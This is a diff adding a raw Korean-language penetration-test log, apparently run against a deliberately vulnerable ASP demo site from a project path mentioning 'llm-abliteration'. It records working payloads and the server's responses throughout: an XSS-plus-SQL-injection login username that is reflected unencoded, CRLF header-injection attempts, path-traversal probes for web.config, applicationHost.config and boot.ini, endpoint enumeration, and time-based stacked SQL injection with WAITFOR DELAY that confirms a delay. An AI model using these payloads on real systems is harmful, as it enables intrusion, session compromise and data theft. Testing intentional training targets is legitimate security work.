@@ -1,0 +1,81 @@
+========================================================================
+A. 세션 사용자명 미인코딩 출력 (로그인 → 메뉴 반사)
+========================================================================
+[A1] POST /Login.asp tfUName=<img src=x onerror=alert(document.domain)>' OR '1'='1'--
+     → 302 size=132 t=0.357130
+     HTTP/1.1 302 Object moved
+     Location: Default.asp
+     로그인 실패 표시? False
+[A2] GET /Default.asp (세션 쿠키 재사용) → 200 size=3539
+     메뉴 원문: 'href="./Logout.asp?RetURL=%2FDefault%2Easp%3F" class="menu">logout <img src=x onerror=alert(document.domain)>\' OR \'1\'=\'1\'--</a> \r\n\t- <a href="https://www.acunetix.com/vulnerability-scanner/sql-injecti'
+     RAW <img 태그 존재? True
+     HTML 인코딩(&lt;img)? False
+
+========================================================================
+B. RetURL CRLF / 헤더 인젝션
+========================================================================
+[B-crlf-lf] RetURL=/Default.asp%0d%0aSet-Cookie:%20splittest=1
+     → 302   헤더: ['Location: /Default.asp%0D%0ASet-Cookie:%20splittest%3D1']
+[B-crlf-onlyLF] RetURL=/Default.asp%0aSet-Cookie:%20splittest2=1
+     → 302   헤더: ['Location: /Default.asp%0ASet-Cookie:%20splittest2%3D1']
+[B-plain] RetURL=/Default.asp
+     → 302   헤더: ['Location: /Default.asp']
+
+========================================================================
+C. traversal 잔여 파일
+========================================================================
+[C] logInput.txt (앱 로그)                 500    1208
+[C] scripts 디렉터리                        500    1208
+[C] IIS applicationHost.config          500    1208
+[C] inetpub wwwroot web.config          500    1208
+[C] boot.ini                            500    1208
+[C] networks                            200    3202 | <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd"> <html><!-- InstanceBegin template="/Templates/MainTemplate.dwt.asp" codeOutsi
+[C] win.ini (대조군)                       200    2835 | <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd"> <html><!-- InstanceBegin template="/Templates/MainTemplate.dwt.asp" codeOutsi
+[C] Default.asp.bak                     500    1208
+[C] web.config.bak                      500    1208
+[C] global.asa                          500    1208
+[C] Templates 템플릿                       200    5594 | <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd"> <html><!-- InstanceBegin template="/Templates/MainTemplate.dwt.asp" codeOutsi
+[C] html/about.html (대조군)               200    4594 | <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd"> <html><!-- InstanceBegin template="/Templates/MainTemplate.dwt.asp" codeOutsi
+[C] logInput.txt (앱 루트)                 500    1208
+[C] logfiles                            500    1208
+
+========================================================================
+D. 미발견 .asp 엔드포인트
+========================================================================
+[D-기준] /nonexistent_zzz.asp → 404 size=1245
+[D] /post.asp                          404    1245
+[D] /showposts.asp                     404    1245
+[D] /users.asp                         404    1245
+[D] /user.asp                          404    1245
+[D] /admin.asp                         404    1245
+[D] /edit.asp                          404    1245
+[D] /delete.asp                        404    1245
+[D] /upload.asp                        404    1245
+[D] /download.asp                      404    1245
+[D] /forum.asp                         404    1245
+[D] /thread.asp                        404    1245
+[D] /newthread.asp                     404    1245
+[D] /postmessage.asp                   404    1245
+[D] /profile.asp                       404    1245
+[D] /members.asp                       404    1245
+[D] /Search.asp.bak                    404    1245
+[D] /Default.asp.bak                   404    1245
+[D] /conn.asp                          404    1245
+[D] /config.asp                        404    1245
+[D] /include.asp                       404    1245
+[D] /header.asp                        404    1245
+[D] /footer.asp                        404    1245
+[D] /Templates/MainTemplate.dwt.asp    200    2488
+[D] /Images/logo.gif                   200    4933
+
+========================================================================
+E. stacked query 가능성 (WAITFOR DELAY 타이밍)
+========================================================================
+[E] 기준선                      id=1                                         →  200 size=   3077 t=0.315470
+[E] boolean 참 대조군            id=1 AND 1=1                                 →  200 size=   3113 t=0.348546
+[E] stacked WAITFOR 5s       id=1;WAITFOR DELAY '0:0:05'--                →  200 size=   3191 t=15.346884
+[E] stacked(따옴표) 5s          id=1';WAITFOR DELAY '0:0:05'--               →  500 size=   1208 t=0.389147
+[E] 서브쿼리 대조군                 id=1 AND 1=(SELECT 1)                        →  200 size=   3147 t=0.342806
+
+done. scratch: /home/taeuk/projects/llm-abliteration/hermes-harness/journal/web/testphp-vulnweb-test/scratch/r7
+EXIT_R7=0
